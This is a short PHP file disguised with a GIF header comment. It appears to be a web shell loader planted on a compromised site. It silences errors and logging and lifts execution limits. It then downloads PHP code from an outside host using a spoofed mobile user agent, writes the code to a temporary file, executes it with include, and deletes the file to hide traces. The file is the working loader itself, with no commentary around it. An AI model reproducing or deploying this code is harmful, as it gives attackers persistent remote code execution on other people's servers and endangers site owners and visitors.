<!-- GIF89;a -->
<?php

@set_time_limit(0);
@clearstatcache();
@error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', '0');
@ini_set('memory_limit', '-1');
@ini_set('output_buffering', '0');

$ip_server = "travelexj.com";
$url_path = "/img/r/477185";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://" . $ip_server . $url_path);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: travelexj.com'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/147.0.7727.99 Mobile/15E148 Safari/604.1');
$data = curl_exec($ch);
$info = curl_getinfo($ch);
curl_close($ch);

if ($data === false) {
    echo "Gagal total: " . curl_error($ch);
} elseif ($info['http_code'] !== 200) {
    echo "Server target memberikan response code: " . $info['http_code'];
} else {

    if (strlen($data) > 0) {
        $tmp = tempnam(sys_get_temp_dir(), 'php');
        file_put_contents($tmp, $data);
        include($tmp);
        unlink($tmp);
    }
}
?>